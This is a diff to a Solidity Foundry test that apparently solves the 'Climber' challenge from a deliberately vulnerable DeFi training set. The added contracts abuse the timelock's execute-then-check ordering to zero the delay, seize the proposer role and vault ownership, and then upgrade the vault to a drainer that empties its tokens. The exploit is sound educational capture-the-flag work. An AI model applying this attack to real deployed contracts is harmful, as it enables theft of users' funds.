@@ -6,6 +6,7 @@ import {Test, console} from "forge-std/Test.sol";
 import {ClimberVault} from "../../src/climber/ClimberVault.sol";
 import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
 import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
+import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 
 contract ClimberChallenge is Test {
@@ -85,7 +86,8 @@ contract ClimberChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_climber() public checkSolvedByPlayer {
-        
+        ClimberAttacker attacker = new ClimberAttacker(timelock, vault, token, recovery);
+        attacker.attack();
     }
 
     /**
@@ -94,5 +96,74 @@ contract ClimberChallenge is Test {
     function _isSolved() private view {
         assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
         assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
+    }
+}
+
+// New vault implementation: a valid UUPS implementation with an unrestricted drain.
+// Run through the vault's own context by upgradeToAndCall.
+contract ClimberDrainer is UUPSUpgradeable {
+    function drain(address token, address to) external {
+        DamnValuableToken t = DamnValuableToken(token);
+        t.transfer(to, t.balanceOf(address(this)));
+    }
+
+    function _authorizeUpgrade(address) internal override {}
+}
+
+contract ClimberAttacker {
+    bytes32 private constant SALT = bytes32("climber");
+
+    ClimberTimelock public immutable timelock;
+    ClimberVault public immutable vault;
+    DamnValuableToken public immutable token;
+    address public immutable recovery;
+
+    // The batch is stored so that scheduleSelf() can schedule the exact same operation id
+    address[] private targets;
+    uint256[] private values;
+    bytes[] private data;
+
+    constructor(ClimberTimelock _timelock, ClimberVault _vault, DamnValuableToken _token, address _recovery) {
+        timelock = _timelock;
+        vault = _vault;
+        token = _token;
+        recovery = _recovery;
+    }
+
+    function attack() external {
+        // The batch runs with the timelock's own admin rights.
+        address[] memory _targets = new address[](4);
+        uint256[] memory _values = new uint256[](4);
+        bytes[] memory _data = new bytes[](4);
+
+        // 1. Delay -> 0, so a scheduled operation is ready immediately
+        _targets[0] = address(timelock);
+        _data[0] = abi.encodeCall(timelock.updateDelay, (0));
+
+        // 2. Make this contract a proposer (the timelock is an admin of its own roles)
+        _targets[1] = address(timelock);
+        _data[1] = abi.encodeCall(timelock.grantRole, (PROPOSER_ROLE, address(this)));
+
+        // 3. The timelock owns the vault; hand ownership to this contract
+        _targets[2] = address(vault);
+        _data[2] = abi.encodeCall(vault.transferOwnership, (address(this)));
+
+        // 4. Call back and schedule this very batch, so the post-execution state check passes
+        _targets[3] = address(this);
+        _data[3] = abi.encodeCall(this.scheduleSelf, ());
+
+        targets = _targets;
+        values = _values;
+        data = _data;
+
+        timelock.execute(_targets, _values, _data, SALT);
+
+        // We now own the vault: upgrade it to the drainer and run drain() in its context
+        address drainer = address(new ClimberDrainer());
+        vault.upgradeToAndCall(drainer, abi.encodeCall(ClimberDrainer.drain, (address(token), recovery)));
+    }
+
+    function scheduleSelf() external {
+        timelock.schedule(targets, values, data, SALT);
     }
 }
